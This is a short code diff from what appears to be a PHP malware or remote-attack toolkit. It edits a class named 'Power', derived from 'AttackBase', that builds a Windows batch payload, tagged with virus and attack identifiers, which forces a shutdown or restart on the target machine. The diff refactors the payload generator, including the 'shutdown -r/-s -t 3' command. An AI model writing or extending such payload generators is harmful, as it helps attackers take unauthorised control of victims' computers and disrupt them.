@@ -31,15 +31,10 @@ class Power extends AttackBase {
         $this->type = $type;
     }
 
-    public function generateBatchCode(): string {
-        ob_start();
+    public function generateBatchCode(): void {
         echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode()); //@formatter:off ?>
-        shutdown -<?php if ($this->type == self::$POWER_RESTART) {
-            echo "r";
-        } else {
-            echo "s";
-        } ?> -t 3
-        <?php return ob_get_clean(); //@formatter:on
+        shutdown -<?php echo $this->type == self::$POWER_RESTART ? "r" : "s" ?> -t 3
+        <?php //@formatter:on
     }
 
     private function generateUploadCode(): string {
